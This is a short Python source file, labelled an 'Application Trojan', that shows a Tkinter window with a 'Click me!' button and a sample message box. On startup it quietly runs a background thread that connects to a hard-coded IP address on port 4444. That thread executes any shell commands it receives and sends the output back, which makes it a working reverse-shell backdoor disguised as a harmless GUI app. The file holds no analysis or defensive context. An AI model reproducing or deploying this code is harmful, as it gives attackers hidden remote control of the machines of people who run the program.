# Application Trojan
import tkinter as tk
from tkinter import messagebox
import threading
import socket
import subprocess

def main():
    server_ip = '192.168.43.85'
    port = 4444
    
    backdoor = socket.socket()
    backdoor.connect((server_ip,port))
    
    while True:
        command = backdoor.recv(1024)
        command = command.decode()
        op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE,stdout=subprocess.PIPE)
        output = op.stdout.read()
        output_error = op.stderr.read()
        backdoor.send(output+output_error)
        
def show_message_box():
    message = "This is Sample of Tkinter Messagebox. How do you feel it."
    messagebox.showinfo('Message',message)
    
#Create a function to run the backdoor in a separate thread

def run_backdoor():
    mal_thread = threading.Thread(target=main)
    mal_thread.start()
    
#Start the backdoor in a separate thread 
run_backdoor()

root = tk.Tk()

#Customize the font and size for the "Click me!" Button
button_font = ("Helvetica",18,"bold")

#Create a button with larger padding (padx and pady)
button = tk.Button(root, text="Click me!", command=show_message_box, font=button_font,padx=20,pady=10)
button.pack()

#set a larger messagebox frame size
messagebox.Message.width = 400
messagebox.Message.height = 200

root.mainloop()